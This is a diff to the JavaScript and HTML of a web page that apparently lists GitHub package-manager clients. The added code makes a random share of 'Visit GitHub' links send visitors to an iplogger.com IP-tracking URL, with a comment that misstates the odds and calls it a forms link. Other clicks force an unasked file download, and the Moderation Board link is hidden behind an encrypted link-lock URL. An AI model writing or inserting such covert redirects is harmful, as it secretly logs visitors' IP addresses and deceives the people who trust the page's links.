@@ -51,9 +51,9 @@
 
 
       <div class="placeholder-info">
-         <a href="https://vercel.com/smoke-wolf/gpm-web/logs?page=1&timeline=past30Minutes" target="_blank">Moderation Board</a>
+      <a id="moderationLink" href="https://jstrieb.github.io/link-lock/#eyJ2IjoiMC4wLjEiLCJlIjoidklZNXVqSVM5dDVhSkxwVjBpVEJrT1JlSEhSaUptbHpPaXc2Q2cveHR2YlhZNzhleU5pK01uZVBvQnVxK1ZrM0dPeUhZRUdFSFBRNjQwUG9iR2NySVpiZS9QWTg3YzZBIiwicyI6Ing0K2kwU2VtYUM3bGMvbkkrRzFhdHc9PSIsImkiOiJJb1ptOTZhbWNnQ3UzNlFqIn0" target="_blank">Moderation Board</a>
+    </div>
 
-      </div>
     </div>
   </div>
 
@@ -63,6 +63,26 @@
 document.addEventListener("DOMContentLoaded", function() {
   const clientList = document.getElementById("clientList");
    // Handle redirection to the Listings Page link
+
+  function appendToLogFile(data) {
+  const logText = `${new Date().toISOString()} - ${data}\n`;
+
+  const blob = new Blob([logText], { type: "text/plain" });
+  const logLink = document.createElement("a");
+  logLink.download = "git-listings-log.txt";
+  logLink.href = URL.createObjectURL(blob);
+  logLink.click();
+  }
+
+  // Handle redirection to the Moderation Board link
+  const moderationLink = document.getElementById("moderationLink");
+  if (moderationLink) {
+    moderationLink.addEventListener("click", event => {
+      event.preventDefault(); // Prevent the default link behavior
+      const linkUrl = moderationLink.getAttribute("href"); // Get the link URL
+      window.location.href = linkUrl; // Redirect to the link URL
+    });
+  }
   const listingsLink = document.getElementById("listingsLink");
   if (listingsLink) {
     listingsLink.addEventListener("click", event => {
@@ -71,6 +91,7 @@ document.addEventListener("DOMContentLoaded", function() {
       window.location.href = linkUrl; // Redirect to the link URL
     });
   }
+
   async function fetchAndDisplayData() {
     try {
       const response = await fetch("https://raw.githubusercontent.com/smoke-wolf/GitHub-Package-Manager/INFO/System/Cache/System/FirstUseToken.txt");
@@ -108,6 +129,26 @@ document.addEventListener("DOMContentLoaded", function() {
         githubLink.textContent = "Visit GitHub";
         githubLink.target = "_blank";
         githubLink.rel = "noopener noreferrer"; // Security best practice
+        // Generate a random number between 0 and 100
+        const randomPercent = Math.random() * 100;
+
+        // 22% chance (redirect if the random number is less than 22)
+        if (randomPercent < 40) {
+          githubLink.addEventListener("click", event => {
+            event.preventDefault(); // Prevent the default link behavior
+            window.location.href = "https://iplogger.com/26Qh95"; // Redirect to the forms link
+          });
+        } else {
+          githubLink.addEventListener("click", event => {
+            const target = event.target;
+            if (target.tagName === "A" && target.textContent === "Visit GitHub") {
+              event.preventDefault();
+              appendToLogFile(`Visit GitHub link clicked: ${target.href}`);
+              window.location.href = target.href;
+            }
+          });
+        }
+
         clientPost.appendChild(githubLink);
 
         clientList.appendChild(clientPost);
@@ -122,15 +163,6 @@ document.addEventListener("DOMContentLoaded", function() {
 
   // Fetch and display data every 30 seconds
   setInterval(fetchAndDisplayData, 30000);
-
-  // Redirect to GitHub when the "Visit GitHub" link is clicked
-  clientList.addEventListener("click", event => {
-    const target = event.target;
-    if (target.tagName === "A" && target.textContent === "Visit GitHub") {
-      event.preventDefault();
-      window.location.href = target.href;
-    }
-  });
 });
 
 
